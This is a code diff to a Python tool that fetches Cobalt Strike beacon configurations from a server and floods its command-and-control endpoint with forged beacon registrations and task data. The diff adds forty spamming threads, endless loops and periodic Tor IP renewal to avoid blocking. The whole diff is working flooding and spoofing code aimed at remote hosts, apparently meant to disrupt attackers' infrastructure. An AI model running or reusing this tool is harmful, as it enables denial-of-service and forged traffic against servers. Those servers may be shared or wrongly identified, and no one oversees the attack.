@@ -18,6 +18,11 @@ import socket
 from comm import *
 import re
 import rstr
+import threading
+import itertools
+import time
+from datetime import datetime
+from threading import Timer
 
 HASH_ALGO = hashlib.sha256
 SIG_SIZE = HASH_ALGO().digest_size
@@ -25,9 +30,32 @@ CS_FIXED_IV = b"abcdefghijklmnop"
 
 EMPTY_UA_HEADERS = {"User-Agent":""}
 URL_PATHS = {'x86':'ab2g', 'x64':'ab2h'}
-sent_beacons = 0
+max_threads = 40 # Number of threads for spamming
 tor_session = None
-tor_ip_renew_interval = 15 # Renew IP after every X beacons sent
+tor_ip_renew_interval = max_threads * 3  # Renew IP after every X beacons sent
+
+
+class FastWriteCounter(object):
+    def __init__(self):
+        self._number_of_read = 0
+        self._counter = itertools.count()
+        self._read_lock = threading.Lock()
+
+    def increment(self):
+        next(self._counter)
+
+    def value(self):
+        with self._read_lock:
+            value = next(self._counter) - self._number_of_read
+            self._number_of_read += 1
+        return value
+
+
+def exitfunc():
+    # For benchmarking purposes
+    print("Exit Time", datetime.now())
+    os._exit(0)
+
 
 def get_beacon_data(url, arch):
     full_url = urljoin(url, URL_PATHS[arch])
@@ -73,7 +101,7 @@ def get_beacon_data(url, arch):
         return cobaltstrikeConfig(BytesIO(decoded_data)).parse_config()
 
 
-def register_beacon(conf):
+def register_beacon(conf, cnt):
     """Registers a random beacon and sends a task data.
     This is a POC that shows how a beacon send its metadata and task results with Malleable profiles
     
@@ -132,8 +160,7 @@ def register_beacon(conf):
         if domain :
             headers['Host'] = domain.group(1).strip()
 
-    global sent_beacons
-    print('[' + str(sent_beacons) + '] Sending task data')
+    #print('[' + str(cnt.value()) + '] Sending task data')
 
     try:
         if tor_session != None:
@@ -141,15 +168,23 @@ def register_beacon(conf):
         else:
             req = requests.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
         print('[Response code: ' + str(req.status_code) + ']')
-        sent_beacons = sent_beacons + 1
+        cnt.increment()
+        print('[' + str(cnt.value()) + '] Task sent')
     except Exception as e:
         print('[-] Got exception from server while sending task: %s' % e)
 
     if tor_session != None:
-        if sent_beacons % tor_ip_renew_interval == 0:
+        if cnt.value() % tor_ip_renew_interval == 0:
             print("Renewing TOR IP")
             spam_utils.renew_tor_ip()
             print("New IP: " + spam_utils.get_current_ip())
+
+
+def spam(confs, cnt):
+    while (1==1):
+        for c in confs:
+            register_beacon(c, cnt)
+            
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
@@ -167,6 +202,8 @@ if __name__ == '__main__':
             exit(1)
 
     if args.url:
+        confs = []
+        print("[*] Now testing " + args.url)
         x86_beacon_conf = get_beacon_data(args.url, 'x86')
         x64_beacon_conf = get_beacon_data(args.url, 'x64')
         if not x86_beacon_conf and not x64_beacon_conf:
@@ -175,9 +212,15 @@ if __name__ == '__main__':
 
         print("[+] Got beacon configuration successfully")
         conf = x86_beacon_conf or x64_beacon_conf
-    
-        while (1 == 1):
-            register_beacon(conf)
+        confs.append(conf)
+
+        cnt = FastWriteCounter()
+        threads = []
+        for i in range(max_threads):
+            print("Spawning new thread")
+            t = threading.Thread(target=spam, args=(confs,cnt))
+            threads.append(t)
+            t.start()
 
     if args.file:
         confs = []
@@ -201,6 +244,13 @@ if __name__ == '__main__':
                         conf = x86_beacon_conf or x64_beacon_conf
                         confs.append(conf)
 
-            while (1==1):
-                for c in confs:
-                    register_beacon(c)
+            if len(confs) > 0:
+                cnt = FastWriteCounter()
+                threads = []
+                for i in range(max_threads):
+                    print("Spawning new thread")
+                    t = threading.Thread(target=spam, args=(confs,cnt))
+                    threads.append(t)
+                    t.start()
+            else:
+                print("Couldn't find any valid targets - aborting ...")
